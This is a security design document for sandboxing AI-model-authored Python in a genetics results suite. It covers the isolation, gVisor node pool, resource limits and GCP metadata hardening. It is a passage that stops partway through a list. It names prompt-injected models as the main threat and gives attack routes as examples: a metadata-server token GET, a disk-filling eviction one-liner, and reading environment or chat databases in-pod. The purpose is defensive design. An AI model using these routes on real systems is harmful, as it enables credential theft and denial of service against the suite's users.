# Code execution: threat model and security design

Status: **design of record**. Every section ends with a decision. The sandbox
implementation tasks (`genetics-results-suite-4h6.6` through `.10`, `.14`, `.15`, `.16`)
implement what is written here; they do not re-open it. Where a decision was a judgement call, the
alternative and its trigger condition are recorded so a later change is a decision, not a
rediscovery.

**Scope.** The model authors Python; that Python runs somewhere and reads suite data. This
document decides *where* it runs, *what it can reach*, *what credential it carries*, and
*who can invoke it*. It does not cover the SDK's own API surface (`4h6.11`) except where
that surface becomes a security boundary — see "Handoffs to other tasks".

**And it does not: the SDK's public function list is NOT a containment boundary**
(`genetics-results-suite-4h6.33`). A script that imports the SDK reaches the full
`ToolExecutor` through `GeneticsClient._executor` — the underscore there is curation of the
recommended surface, not enforcement — and httpx is present regardless, since it is the SDK's
own transport. So a script can call anything the egress policy permits, whether or not the SDK
wraps it, and "absent from the SDK" must never be read as "unreachable". The egress allow-list
specified in section 3 ("Egress policy") — not the SDK — is what makes a target unreachable, with
one exception it does not cover: link-local (169.254.169.254), where the load-bearing defence is
the node pool's `GKE_METADATA` mode and the missing Workload Identity binding rather than this
policy (see section 3). And it is the *specified* boundary, not yet a live one: the sandbox is not
deployed, and `k8s/network-policies/sandbox-policy.yaml` stays decoration until
`genetics-results-suite-4h6.7` ships a Deployment carrying the labels it selects. The SDK decides
only what is convenient.

**Threat actors, in the order they matter:**

1. **A prompt-injected model.** Tool results and user-supplied attachments enter the
   model's context. A hostile string in a phenotype description, a Europe PMC abstract or
   an uploaded TSV can cause the model to author a malicious script. This is the *primary*
   actor: it needs no attacker access to the cluster and no compromised account.
2. **An authorized user acting maliciously.** Access is gated by the oauth2-proxy
   allow-list (named addresses plus `broadinstitute.org` / `finngen.fi` domains), so this
   is an insider, not an anonymous attacker.
3. **Anyone who can reach mcp-server.** mcp-server is *not* behind oauth2-proxy and accepts
   four bearer paths (`MCP_API_KEY`, Google Identity Tokens, per-user chat API tokens,
   Keycloak OAuth 2.1 tokens from registered third-party clients). Its reachability is
   materially broader than the browser's, which is why section 5 exists.

---

## 1. Why in-process execution is unacceptable

The mechanism already exists in the codebase and is switched off. It is switched off for
good reasons, and those reasons are the requirements list for everything below.

**chat-backend runs as root.** `docs/project-spec.md` (Security section) records that
`results-api`, `chat-backend` and `mcp-server` "still run as root because they raise
`ulimit`, shell out to `gcloud`, cache tabix indexes, or own root-owned files on the
`chat-data` PVC". chat-backend additionally sets `fsGroup: 1032` so pre-existing SQLite
files stay writable once `CAP_DAC_OVERRIDE` is dropped. Model-authored code executing
inside that pod is uid 0 with a writable `chat-data` PVC mounted at `/data`. That PVC
holds `chat_history.db` (every conversation in the deployment, all users) and
`llm_config.db` (**user-authored prompt text**, which is fed back into the system prompt).
A script running there can read every other user's conversations and can *write* prompt
text that will later be prepended to somebody else's chat — a persistence primitive, not
just a read.

**The environment allow-list is scar tissue, not caution.**
`genetics-mcp-server/src/genetics_mcp_server/skills/sandbox_tools.py` (referred to below as
just `sandbox_tools.py`) line 17
carries its own history in a comment above `_ALLOWED_ENV_KEYS`:

> Environment passed to model-authored scripts, as an allow-list. This was previously a
> deny-list of key prefixes, which missed `INTERNAL_API_SECRET` (the credential that
> authenticates as "mcp-tool" to results-api) along with the internal service URLs — every
> variable nobody thought to add stayed exposed. Anything not named here is dropped.

So an earlier version of exactly this feature leaked the suite's internal service
credential into model-authored scripts. The allow-list (`PATH`, `HOME`, `LANG`, `LC_ALL`,
`TMPDIR`, `TZ`, `TERM`, `PWD`, `SHELL`, `USER`) is the correct fix for the *leak*, but it
is a fix applied inside the same process, same uid, same network namespace and same mounted
PVC as the credential it is hiding. `_validate_path` (line 26) exists for the same reason:
path traversal out of the allowed directories was already a live concern in the in-process
design. Both are string-level defences against code that has full process privileges — the
script can call `os.environ` from `/proc/self/environ` of any sibling, or simply open
`/data/chat_history.db` directly, and neither control applies.

`execute_script` (line 104) allows `python3`, `Rscript` **and `bash`**, passes the script on
stdin, and enforces nothing beyond a 30-second `asyncio.wait_for`. There is no memory cap,
no pid cap, no output cap and no network restriction whatsoever.

**Current production state (verified).** `ENABLE_SCRIPT_EXECUTION` is `"false"` in
`k8s/deployments/chat-backend.yaml` (line 119) *and* in `k8s/deployments/mcp-server.yaml`
(line 65). chat-backend has `SUBAGENT_ALLOWED_PATHS: "/data"` — the chat-data PVC mount
point — so if the flag were flipped today, model-authored scripts would get root-owned
read/write access to every conversation in the deployment. mcp-server has
`SUBAGENT_ALLOWED_PATHS: ""`, which `_validate_path` treats as "no allowed paths
configured" and rejects.

**Decision.** In-process execution stays permanently disabled.
`ENABLE_SCRIPT_EXECUTION=false` remains in both deployment manifests and is not a rollout
toggle for this feature. Code execution moves to a separate pod, in a separate node pool,
with a separate identity, reached over HTTP from chat-backend only. `sandbox_tools.py`
keeps `_validate_path` — whose *logic* `read_artifact` reuses (`4h6.15`), but inside the
sandbox pod and against a `/scratch/<id>/artifacts` allow-list, **never** against
chat-backend's `SUBAGENT_ALLOWED_PATHS`; see the `read_artifact` subsection in section 6.
`execute_script` is not the execution path and gains no new callers.

---

## 2. Isolation boundary

The **suite baseline** referred to in the table below is what the suite's *own* service
containers set: `allowPrivilegeEscalation: false`, `capabilities.drop: ["ALL"]` and
`RuntimeDefault` seccomp, with `db-api` (uid 10001), `bff` (uid 1000) and — since
`genetics-results-suite-a7n` — both containers of `auth-gateway` (uid 101, pod-level)
additionally `runAsNonRoot`. It is **not** a cluster-wide property and never was: eight third-party and
support workloads set none of it. `docs/project-spec.md` → Security holds the authoritative per-workload list —
do not duplicate that enumeration here. The sandbox must exceed this baseline, because it
is the only workload in the cluster that executes attacker-influenceable code *by design*.

### Decisions

| Control | Decision | Why |
|---|---|---|
| Base image | `gcr.io/distroless/python3-debian12:nonroot`, multi-stage with a venv built in a `python:3.12-slim` stage | No shell, no package manager, no `curl`. `execute_script`'s `bash` interpreter is not merely un-allow-listed, it is absent from the filesystem. |
| uid / gid | `runAsNonRoot: true`, `runAsUser: 65532`, `runAsGroup: 65532` | The distroless `nonroot` identity. Deliberately not 1032/1000/10001 — none of the existing suite uids, so no accidental filesystem-permission overlap if a volume is ever attached by mistake. |
| `readOnlyRootFilesystem` | `true` | Exceeds the cluster baseline. The only other containers that set it are `auth-gateway`'s two (`genetics-results-suite-a7n`), and they need two writable `emptyDir`s to do so; the sandbox needs none. |
| Capabilities | `drop: ["ALL"]`, no `add` | Matches baseline. |
| `allowPrivilegeEscalation` | `false` | Matches baseline. |
| Seccomp | `RuntimeDefault` | Matches baseline; see the rejection note below. |
| Service account | dedicated KSA `sandbox`, **no** Workload Identity binding, `automountServiceAccountToken: false`, **on a node pool in `GKE_METADATA` mode with a dedicated node service account** | **Critical, and the node pool is load-bearing — see the node-pool spec below.** Eight of the suite's fifteen workloads use `serviceAccountName: genetics-suite`, one names `sandbox` (this one, since `genetics-results-suite-4h6.7`) and the remaining six name no KSA and fall to the namespace `default` (the fifteen are every pod-template workload under `k8s/`: fourteen in `k8s/deployments/`, the two CronJob manifests there included, plus `k8s/cronjobs/keycloak-postgres-backup.yaml` — re-derive rather than trusting these numbers, and note that a `k8s/deployments/`-scoped grep misses the backup CronJob), which `terraform/iam.tf` binds via Workload Identity to a GSA holding `roles/bigquery.dataViewer`, `bigquery.jobUser`, `artifactregistry.reader`, `logging.viewer` and `storage.objectViewer` (five roles; re-derive with `grep 'role  *=' terraform/iam.tf | grep -v workloadIdentityUser` — the bare grep prints six, the sixth being the Workload Identity binding on the GSA itself rather than a permission it grants). **Every one of those resources, the GSA itself and the `roles/iam.workloadIdentityUser` binding are `count = var.manage_iam ? 1 : 0`** — under `manage_iam = false` terraform creates none of them and the platform team owns the equivalent out of band, which is exactly the deployment where the metadata-server defaults bite (section 7). If the sandbox used that KSA, a three-line script hitting the metadata server would obtain direct BigQuery and GCS credentials and every other control in this document would be decoration. The guarantee that no usable GCP credential is reachable is **`GKE_METADATA` mode on the node plus no Workload Identity binding for the KSA** — those two together. `automountServiceAccountToken: false` is not part of that guarantee: it defends the **Kubernetes API server** (no projected KSA token in the container, so no `kubectl`-equivalent access) and defends nothing whatsoever against the GCP metadata server, which is reached over the network and needs no mounted token. The sandbox is **no longer the only** workload that sets it — `auth-gateway` does too since `genetics-results-suite-o5i`, which is also why `scripts/test-network-policies.py` no longer treats the field as a sandbox-only tell. |
| Volumes | exactly one `emptyDir`: `/scratch` (`sizeLimit: 512Mi`). **No PVC, ever. No pod-level `/tmp`.** | `chat-data` is the crown jewels (section 1). A pod-level `/tmp` was specified in an earlier draft and is **removed**: it outlives an execution, and with `replicas: 1` and `concurrency: 1` successive users are *guaranteed* to share the same pod, so a shared `/tmp` is a sequential cross-conversation channel (see the Writable-paths row and section 6.4). Temp space comes out of the per-execution directory instead; the 512Mi `sizeLimit` is therefore the combined artifact-plus-temp budget, which makes supervisor-enforced sub-quotas mandatory — see "Staying under `sizeLimit`" below. |
| Writable paths | `/scratch/<execution-id>/` only, including `/scratch/<execution-id>/tmp`. `TMPDIR`, `HOME`, `MPLCONFIGDIR`, `XDG_CACHE_HOME` and `PYTHONPYCACHEPREFIX` all point inside it. | One directory per execution, created before the fork. Everything in it is deleted on completion, or at a 15-minute TTL if the execution never completes — with the single exception of `/scratch/<execution-id>/artifacts`, which is retained for 15 minutes after completion so `read_artifact` has something to return (see the `read_artifact` subsection in section 6, which is where that lifecycle is settled). Nothing writable is shared between executions. With `readOnlyRootFilesystem: true` and no `/tmp` volume, `/tmp` is not writable at all, so a library that hardcodes it fails loudly at build/test time rather than quietly acquiring a shared channel — which is the outcome we want. If some dependency turns out to require a writable `/tmp` and cannot be redirected, adding the volume back is a **recorded degradation**, not a free fix, and it comes with a hard obligation: the supervisor wipes `/tmp` completely immediately before every fork, so no bytes survive from the previous execution. The supervisor also wipes, at startup, any `/scratch` entry that does not belong to a live or still-retained execution — a crash mid-execution must not leave a readable directory behind. |
| Memory | `requests: 1Gi`, `limits: 3Gi` | Enough for a polars aggregation over a realistic credible-set pull. The cgroup OOM kill is the enforcement. **It is not a guarantee that the child dies and the supervisor survives** — the kernel picks by `oom_score`, which is a heuristic over RSS, and gVisor changes the accounting because the sentry holds memory on the application's behalf. So this is made deterministic instead: the supervisor sets its own `oom_score_adj` low (e.g. `-500`) and the child's high (e.g. `+500`), and sets `RLIMIT_AS` on the child at a value that leaves the supervisor explicit headroom under the 3Gi cgroup limit. The child hitting `RLIMIT_AS` gets a clean `MemoryError` inside its own process, which is a better failure than an OOM kill in either direction. |
| CPU | `requests: 500m`, `limits: 1500m` | The mining cap. Note it is **not** comfortably under the node: an `e2-standard-2` has ~1930m allocatable, so a sandbox burning its full limit leaves ~430m for the supervisor's own thread, the kubelet and the gVisor sentry. It is the `requests: 500m` that keeps the pod schedulable; the 1500m limit is a burst ceiling that a co-scheduled workload would contend with. If the pool machine type changes, revisit both numbers together. |
| pids | `pod_pids_limit: 1024` in the sandbox node pool's `kubelet_config`, plus a child pid budget set from the supervisor's own needs and **far below** that ceiling | Fork-bomb containment. Per-pod pid limits are a kubelet setting, not a pod-spec field, which is a further reason the sandbox needs its own node pool. **`RLIMIT_NPROC` alone does not work as specified in an earlier draft:** it is a limit per *real uid* across the pid namespace, and the supervisor runs as the same uid 65532 as the child, so a child forking to its `RLIMIT_NPROC` also prevents the *supervisor* from forking — the fork bomb takes out the supervisor instead of being contained. Two ways to fix it, and `4h6.7`/`4h6.41` must pick one explicitly: (a) run the child as a **second non-root uid** distinct from the supervisor's, which restores `RLIMIT_NPROC` as a genuine per-execution control; or (b) keep one uid and enforce the pid budget from the supervisor by watching the child's process group and killing it above a threshold sized from what a legitimate script needs (tens of processes, not hundreds) rather than from the kubelet ceiling, treating `RLIMIT_NPROC` as advisory only. (a) is preferred; it costs one extra uid in the image and a `chown` of `/scratch/<execution-id>` to the child uid before the fork — and it has the side benefit of putting the supervisor's memory and the token file out of the child's same-uid reach (section 4, token delivery). It is **not** free of ownership consequences, though: see "Permission contract" below, which `4h6.39`/`4h6.41` must implement in full if they take (a). **DECIDED: (b)** — `4h6.7` picked the shared uid, because (a) needs `CAP_SETUID`/`CAP_SETGID`/`CAP_CHOWN` that this pod drops; see "The uid choice" below for the reasoning and the two costs, and do not read "(a) is preferred" here as the state of the code. |
| Ephemeral storage | `requests: 1Gi`, `limits: 2Gi` | Backstop under the `emptyDir` `sizeLimit`s. |
| Wall clock | **60s default, 120s hard ceiling**, not overridable by the model | The current in-process timeout is 30s, which is too short once one script replaces a chain of tool calls; the existing `terminationGracePeriodSeconds` comment in chat-backend.yaml records that a chat turn "routinely runs 1-3 minutes", so 120s is the largest value that does not make the sandbox the dominant term in turn latency. |
| Output cap | 64 KiB returned to the model (first 32 KiB + last 32 KiB with an explicit elision marker); the reader stops at 8 MiB from the pipe and kills the child | Head-and-tail because the model needs the traceback, which is at the tail. The 8 MiB pipe cap stops `while True: print(...)` from consuming the supervisor's memory before the wall clock fires. The 64 KiB figure is a *context* decision as much as a security one — the epic's justification is the context-accumulation curve (39k → 117k tokens), and an unbounded stdout would defeat it. |
| Concurrency | **1 execution per pod**, queued beyond that | Measured peak is 23 chat turns/hour (one every ~2.6 minutes), so queueing costs nothing. In exchange it removes cross-user co-tenancy *inside* the pod entirely: two concurrent children would share a pid namespace and `/proc`, and there is no per-fork isolation available to fix that. |
| Replicas | 1 | Peak 23 turns/hour, p95 8, mean 3. Do not build for concurrency that does not exist. |

### What the manifest adds beyond this table

`k8s/deployments/sandbox.yaml` (`genetics-results-suite-4h6.7`) implements every row above.
Five things it declares are **not** in the table, four of them controls this document did not
specify; the per-field rationale lives in `docs/project-spec.md` → "The sandbox Deployment"
and is not duplicated here.

- **`enableServiceLinks: false`.** Kubernetes otherwise injects `<SERVICE>_SERVICE_HOST` /
  `_PORT` variables for every Service in the namespace into the pod's environment — the whole
  internal inventory and its ClusterIPs, handed to untrusted code for free. Nothing in the
  egress allow-list becomes reachable through them, but the disclosure is gratuitous.
- **`dnsPolicy: None` with a `127.0.0.1` nameserver and `ndots:1 timeout:1 attempts:1`.** "On
  DNS" below argues the resolver must not be a sink and that a *stall* is the failure shape to
  avoid; leaving `dnsPolicy` at the default `ClusterFirst` writes kube-dns into
  `/etc/resolv.conf` and gets exactly that stall against an egress policy that drops 53/UDP.
  Pointing the resolver at loopback turns the stall into an immediate `ECONNREFUSED`. It is a
  second line, not a replacement: `/etc/nsswitch.conf` ordering and `hostAliases` still do the
  work, and the egress policy is still what denies the network.
- **`strategy: Recreate` and no `livenessProbe`.** Both are availability decisions with a
  security edge. A rolling update would put a second sandbox pod on a pool pinned at one node
  and break "one execution at a time" from per-pod to per-cluster; a liveness probe racing a
  legitimate 120s execution restarts the pod and kills the script, which the supervisor's own
  wall clock already handles.
- **No `command` / `args`.** The image ships no `CMD` on purpose and the supervisor (`4h6.39`)
  does not exist yet, so an applied pod would start `python3` with no script and
  CrashLoopBackOff — it *schedules*, so this is not the Pending case. `scripts/deploy.sh`
  therefore refuses to apply the file at all while it declares neither field, naming `4h6.39`;
  the refusal is keyed on the manifest and clears itself when `4h6.50` adds `args:` (the last
  bead of the supervisor chain — `4h6.39` deliberately does not touch the manifest).
- **The apply is gated on the node pool.** `scripts/deploy.sh` skips the file unless
  `ENABLE_SANDBOX=true`, derived from `sandbox_pool_enabled` in `terraform.tfvars` rather than
  being a second switch, and refuses the apply outright if no node carries `workload=sandbox`
  — the pod tolerates a taint only the gVisor pool has, so applying it without the pool leaves
  a permanently Pending pod behind a `kubectl apply` that returned 0. Both refusals live in a
  **preflight that runs before the first apply of the deploy**, not in the manifest loop where
  `sandbox.yaml` sorts second-to-last and an `exit 1` would leave every other manifest applied
  and every rollout unrolled.
- **`SANDBOX_ENABLED` on db-api and results-api** stays `"false"` until the separate,
  deliberate enablement step, and `scripts/test-network-policies.py` reports that pairing as a
  note instead of a failure **only when it has confirmed against the cluster that no sandbox
  Deployment is live**. `ENABLE_SANDBOX` alone does not license the relaxation: it means "this
  run will not apply it", and deploy.sh *skips* the manifest rather than deleting it, so a
  later gate-off deploy can run against a sandbox that is still serving. A live sandbox with
  the gate off is a hard failure there; an undeterminable cluster fails closed.

### The uid choice: option (b), one shared uid — DECIDED (`4h6.7`)

The pids row above obliges `4h6.7`/`4h6.41` to pick (a) or (b) explicitly. **The choice is (b):
the supervisor and the child both run as uid 65532**, which is what `k8s/deployments/sandbox.yaml`
now declares (`runAsUser: 65532`, `runAsGroup: 65532`, `fsGroup: 65532`, and no second uid
anywhere).

**It is forced, not preferred.** Option (a) needs three things the pod's own hardening
forecloses: `setuid` to a second uid before the fork, a `chown` of `/scratch/<id>` to that uid,
and a `chown` of the token file to it at mode `0400`. With `capabilities.drop: ["ALL"]` and
`allowPrivilegeEscalation: false` the container holds no `CAP_SETUID`, `CAP_SETGID` or
`CAP_CHOWN` — measured in this pod's shape, `setuid(65533)` and `chown(65533)` both return
`EPERM`. Taking (a) would mean adding those three capabilities back to the one workload in the
cluster that executes attacker-influenceable code by design, which contradicts the baseline this
ticket exists to establish. That trade is not worth `RLIMIT_NPROC`, and it must not be made
silently by a later ticket that reads only the "(a) is preferred" line above.

**What it costs, stated plainly, because the supervisor beads inherit both — `4h6.41` the pid
budget, `4h6.43` the token file:**

- **`RLIMIT_NPROC` is not a per-execution control.** It is a limit per *real uid* across the pid
  namespace, so a child forking to its limit also stops the supervisor forking. `4h6.41` must
  enforce the pid budget from the supervisor — watch the child's process group and kill above a
  threshold sized from what a legitimate script needs (tens of processes) — and treat
  `RLIMIT_NPROC` as advisory only. The kubelet's `pod_pids_limit: 1024` remains the outer
  backstop and is not a substitute.
- **The token file is within the child's same-uid reach.** `/proc/<pid>/environ` is readable by
  any process with the same uid, and mode `0600` on a supervisor-owned file does not exclude a
  same-uid child or any helper it spawns (see the token-delivery numbered list in section 4).
  The mitigation is lifetime, not permissions: the SDK reads the file once and unlinks it, so the
  window is the interval before its first call, and `/scratch/<id>` is wiped regardless.

**`4h6.39` must not assume it can drop privileges.** There is no uid to drop to and no capability
to do it with; a supervisor written against option (a) will fail at runtime with `EPERM`, not at
review. The section below is retained for the case where that trade is ever revisited *together
with* the capability grant it requires — it does not describe what is implemented today.

### Permission contract for the second-uid option (NOT IN EFFECT — see the decision above)

Option (a) of the pids row — a distinct child uid — is preferred, and it silently breaks two
things unless the ownership rules are stated. Both have an obvious wrong fix that an
implementer will reach for under time pressure, which is why the contract is written out
rather than left to be derived.

**What breaks.** With `/scratch/<id>` chown'd to the child uid, the artifacts the child
writes are owned by the **child**, while the **supervisor** is the process that serves
`read_artifact` and runs the 15-minute reaper — under any restrictive umask it cannot read
them. Symmetrically, the mode-0600 token file the supervisor writes (section 4, token
delivery) is owned by the **supervisor** and is unreadable by the **child**, which is the
process that needs it. Section 4 justifies the file against the shared-uid option and never
states this.

**The wrong fixes, named so they are recognisable in review:** `chmod 0777` on the artifacts
directory (which hands a future second child a shared writable path, re-opening the
cross-execution channel section 6.4 closed), or quietly falling back to a shared uid —
which withdraws the pid control *and* the `/proc/<pid>/environ` protection that were the
entire reason for choosing (a).

**The contract:**

- A **shared gid `65532`**, which both the supervisor uid and the child uid belong to. The
  uids differ; the gid does not. This is what carries access in both directions.
- `/scratch/<id>` is mode **`0750`**, owned **`child:65532`** — child owns it (so
  `RLIMIT_NPROC`-era per-uid reasoning and write access hold), supervisor reaches it through
  the group, nothing else reaches it at all.
- `/scratch/<id>/artifacts` and its contents are mode **`0640`** (directory `0750`), group
  `65532`, so the supervisor can read and reap what the child wrote without any world bit
  being set. The SDK sets this explicitly rather than relying on the child's umask.
- The token file is written by the supervisor, then **`chown`'d to the child uid at mode
  `0400`** *before* the fork. The child can read it once and unlink it; the supervisor never
  needs to read it back.
- Under option (b) — one shared uid — none of this applies; the trade there is the loss of
  the `/proc/<pid>/environ` protection recorded in section 4.

### Staying under `sizeLimit`: the supervisor enforces sub-quotas, the kubelet must never fire

Two decisions elsewhere in this document interact badly and the interaction has to be
closed explicitly. Removing the pod-level `/tmp` made 512Mi the **combined** artifact-plus-
temp budget, while `read_artifact` (section 6) retains **every** execution's `artifacts/`
for 15 minutes after completion. Exceeding an `emptyDir` `sizeLimit` does not fail the
write — the **kubelet evicts the pod**. That kills the in-flight script *and* destroys every
retained artifact from every earlier execution in the window. A script can trigger it
deliberately with `open('/scratch/<id>/tmp/x','wb').write(b'\0'*512*1024*1024)`: a
self-inflicted denial of service against the next several turns, which neither the volumes
row nor the retention rule anticipated on its own.

**Decision: supervisor-enforced sub-quotas, well under `sizeLimit`.** Specifically:

- A **per-execution artifact quota of 64Mi** on `/scratch/<id>/artifacts`, enforced by the
  supervisor. Over quota is a clean error returned to the model, not an eviction.
- A **per-execution total quota** on all of `/scratch/<id>` (artifacts + temp + inputs +
  caches), enforced the same way, sized so that one execution plus the full retained set
  cannot approach 512Mi.
- An **aggregate retained-artifact ceiling** across all retained `artifacts/` directories,
  with **oldest-first eviction** when a new execution would breach it — so retention
  degrades gracefully instead of accumulating until the kubelet intervenes.
- Enforcement is by the supervisor polling actual usage, not by trusting the child: the
  child writes directly to the filesystem and there is no syscall interposition available.
  Poll interval must be short enough that a fast writer is killed before 512Mi (the child
  is CPU-limited to 1500m, which bounds how fast it can get there).

**Why not the alternative of putting `artifacts/` on a second small `emptyDir`.** It reads
like the cleaner fix and it does not work: `sizeLimit` eviction is a **pod-level** action.
A script that fills the temp `emptyDir` still gets the pod evicted, and the second
`emptyDir` — being pod-local too — dies with it. Separating the volumes changes which
volume is over budget, not whether the pod survives, so it protects neither the retained
artifacts nor the in-flight script. Only a quota that keeps usage below `sizeLimit` in the
first place does that, which is why the supervisor has to hold the budget.

### gVisor (GKE Sandbox): adopted, on its own node pool

**Decision: yes, and this settles the node-pool question rather than complicating it.**

The argument against is real: GKE Sandbox cannot be enabled on an existing pool's workloads
selectively — it requires a pool created with `sandbox_config { type = "gvisor" }`,
which is a *dedicated* pool, and gVisor's syscall interception costs measurably on the
`mmap`/`futex`-heavy paths that numpy and polars live on.

The argument for is decisive. Every other control in this document assumes the container
boundary holds, and that boundary is a shared Linux kernel on a node — and on the existing
pool that is a node whose `node_config` carries the `cloud-platform` OAuth scope and the
`genetics-suite` service account. A kernel LPE from a container that already has
arbitrary code execution — precisely our situation — reaches the node. gVisor is the only
control in the catalogue that addresses that, and the population of people who can trigger
script authoring includes anyone who can get a string into the model's context.

**The cost argument does *not* invert, and an earlier version of this paragraph claimed it
did.** It asserted that the primary pool was pinned at 2 × `e2-standard-4` and already
overshot one node on both axes (3951m / 13.60 GiB), so a separate pool was nearly free.
`genetics-results-suite-262` established that the pinning was never applied to any live
profile — the primary pool autoscales 1-3 and runs **one** node — and re-derived the
arithmetic: under the live **finngen** profile a full deploy peaks at 3226m / 12498 Mi
against 3920m / 13273 Mi allocatable, i.e. it **fits**, with 775 Mi to spare. See `docs/project-spec.md`
("Node pool sizing") for the current table. So the honest accounting is: putting the sandbox
on the existing pool would push finngen over and force a second node; putting it on its own
pool leaves the primary surge budget **untouched** (the sandbox contributes 0m and 0 GiB) at
the cost of **one permanently-running `e2-standard-2`**. gVisor was chosen anyway, on the
isolation grounds above and not on cost.

**Specification for `4h6.10`:**

**Implemented** as `google_container_node_pool.sandbox_nodes` in `terraform/gke.tf`
(`4h6.10`), behind `var.sandbox_pool_enabled` (**default `false`** — `scripts/deploy.sh` runs
`terraform apply -auto-approve` on every full deploy, so an ungated pool would be created by a
routine deploy nobody opted into).

Two corrections against the spec as originally drafted below, and they are **not** of equal
standing — do not read them as a pair:

- **Tool-verified.** The provider argument is `sandbox_config { type = ... }`, not
  `sandbox_type`; `terraform validate` rejects the latter outright. (One thing even this does
  not settle: the GKE REST enum is `GVISOR` and the provider does no normalization — there is no
  lowercase `gvisor` string in the binary — so whether the API accepts `"gvisor"` is
  **unverified** and is a 30-second check at the first real apply. If rejected, the value becomes
  `"GVISOR"` here and in `docs/project-spec.md` too.)
- **Not verified by anything.** `pod_pids_limit` was raised from 256 to **1024** on the strength
  of GKE's *documented* minimum. `terraform validate` did **not** find this and does not confirm
  it: the provider schema is a bare optional number with no range check, so it passes on 256 as
  readily as on 1024. `terraform/gke.tf` and `docs/project-spec.md` both mark it **UNCONFIRMED**
  against this cluster (`genetics-results-suite-5r2`); this copy says the same. Only a real pool
  creation settles it.

- New `google_container_node_pool` `<cluster>-sandbox-pool`,
  `min_node_count == max_node_count == 1`. The pinning rationale here is *not* inherited from
  the main pool (which autoscales 1-3 — see `genetics-results-suite-262`): it is that a
  scale-down would kill an in-flight script, with no second replica.
- `machine_type = "e2-standard-2"`, `sandbox_config { type = "gvisor" }`,
  `kubelet_config { pod_pids_limit = 1024 }`. Sizing on an `e2-standard-2`: CPU allocatable is
  1930m; **memory allocatable is not derivable offline** — the capacity-minus-reservations method
  gives 6249 Mi but provably overstates (the same method gives 13622 Mi for the measured
  `e2-standard-4`, whose real allocatable is 13273 Mi), so 6249 Mi is an **upper bound**, not a
  value. The overhead the pod actually shares the node with is **not** the primary node's
  876m / 1.33 GiB: ~487m / ~555 Mi of that is singletons (kube-dns, metrics-server, konnectivity,
  the autoscalers) that do not tolerate `sandbox.gke.io/runtime=gvisor:NoSchedule` and cannot
  land here. What can is the DaemonSet set, measured at ~383m / ~769 Mi, plus `gke-metadata-server`
  (undeterminable offline — WI is off on this cluster, so the DaemonSet does not exist) and the
  GKE Sandbox components (of which `runsc-metric-server` is measurable, dormant at 3m / 12 Mi).
  An earlier draft claimed the pod's 1500m ceiling was unsatisfiable alongside the system pods
  (876m + 1500m = 2376m > 1930m); on the correct base, 383m + 1500m = 1883m < 1930m, so **that
  conclusion is not established** — and the undetermined rows mean the reverse is not established
  either. Full table in `docs/project-spec.md`, "The sandbox pool".
  **UNVERIFIED, and `4h6.10` must settle it before relying on either number.** Two open
  questions that cannot be answered from this checkout or read-only from the live project —
  as of 2026-08-13 the `finngenie` cluster (`europe-west1-b`) has exactly one node pool,
  `finngenie-pool`, `e2-standard-4`, **no `sandboxConfig`**, so there is no gVisor node
  anywhere to measure against:
  (a) the runsc **sentry's** memory footprint. It is charged to the pod's cgroup, so it eats
  into the 3Gi limit in the Memory row above, and the `RLIMIT_AS` headroom that row asks for
  must cover supervisor **plus sentry**, not supervisor alone. The figure is workload-shaped
  (it tracks the app's mapped memory and open fds) and no published constant substitutes for
  measuring it.
  (b) whether `e2-standard-2` satisfies GKE Sandbox's machine-type requirements on this
  cluster's release channel and version. Confirming it needs a real `terraform apply` in a
  non-production project — the same apply the review gate below already requires — because
  the constraint is enforced at pool creation, not at plan.
- **`node_config.workload_metadata_config { mode = "GKE_METADATA" }`, unconditionally.**
  This is not optional and it is not a copy of the primary pool's arrangement.
  `terraform/gke.tf` (primary pool, ~lines 57-72) sets `workload_metadata_config` inside a
  `dynamic` block gated on `var.manage_iam`, and its `service_account` likewise falls back
  to `null` when `manage_iam = false` and `node_service_account` is empty. A new pool
  written from a bare spec of `machine_type` + `sandbox_config` + `kubelet_config` inherits
  the provider defaults for everything else, and those defaults are exactly wrong here:
  `workload_metadata_config` unset means **`GCE_METADATA`**, which exposes the raw GCE
  metadata server to every pod on the node, and `service_account` unset means the **Compute
  Engine default service account**, which in most projects carries `roles/editor`. A script
  then does one HTTP GET to
  `169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token` and holds a
  project-level access token. Note what this defeats: Workload Identity is *irrelevant* in
  `GCE_METADATA` mode, because in that mode the identity handed out is the node's and is
  not derived from the KSA at all — "the sandbox KSA has no WI binding" stops being a
  statement about anything.

  **But `GKE_METADATA` is necessary, not sufficient, and `4h6.10` establishes only half of
  the control.** It does not deny credentials; it swaps *node* identity for *KSA* identity.
  The other half — the sandbox KSA having **no** Workload Identity binding — is established by
  nothing in the terraform change, and the repo's house style is the failure mode: all 8
  deployments in `k8s/deployments/*.yaml` set `serviceAccountName: genetics-suite`, and
  `terraform/iam.tf` binds exactly that KSA to a GSA holding `bigquery.dataViewer`,
  `bigquery.jobUser`, `storage.objectViewer` and `logging.viewer`. **Whoever writes
  `k8s/deployments/sandbox.yaml` must give it a dedicated KSA with no
  `iam.gke.io/gcp-service-account` annotation and no `google_service_account_iam_member`
  binding — explicitly not `genetics-suite`, and not the namespace `default` either.** Copy
  the house style and `GKE_METADATA` buys nothing at all. The same warning is repeated in
  `terraform/gke.tf`'s pool comment, where a reviewer of the pool will see it.
- **`GKE_METADATA` requires cluster-level Workload Identity, so the cluster resource must
  change too — this is not optional and it is not a detail.**
  `workload_metadata_config { mode = "GKE_METADATA" }` is rejected by the GKE API unless
  the *cluster* has a `workload_pool` configured. In `terraform/gke.tf`,
  `google_container_cluster.primary`'s `workload_identity_config` is itself inside a
  `dynamic` block with `for_each = var.manage_iam ? [1] : []`. So under
  `manage_iam = false` there is **no `workload_pool`**, and an unconditional
  `GKE_METADATA` node pool fails **at apply, not at plan**. `4h6.10` must therefore also
  make the cluster's `workload_identity_config` **unconditional** —
  `workload_pool = "${var.project_id}.svc.id.goog"` always, outside the `dynamic`. That is
  an **in-place cluster update**: it does not recreate the cluster, and it does not change
  any existing node pool's metadata mode (each pool's `workload_metadata_config` is
  independent, and the primary pool's stays exactly as it is today).

  Why this is called out so heavily: the apply-time failure has a cheap wrong fix. An
  implementer who hits `Workload Identity is not enabled` on `terraform apply` will reach
  for the obvious escape — re-gate the sandbox pool's `workload_metadata_config` on
  `var.manage_iam`, matching the primary pool — which reintroduces the `GCE_METADATA` hole
  verbatim in exactly the deployment where it is most dangerous.
- **A dedicated node service account, mandatory under `manage_iam = false`.** Not
  `genetics-suite` (that GSA holds the BigQuery, GCS and logging roles the sandbox must
  never reach), and not the Compute Engine default. A new GSA carrying only what a node
  needs — `roles/logging.logWriter`, `roles/monitoring.metricWriter`,
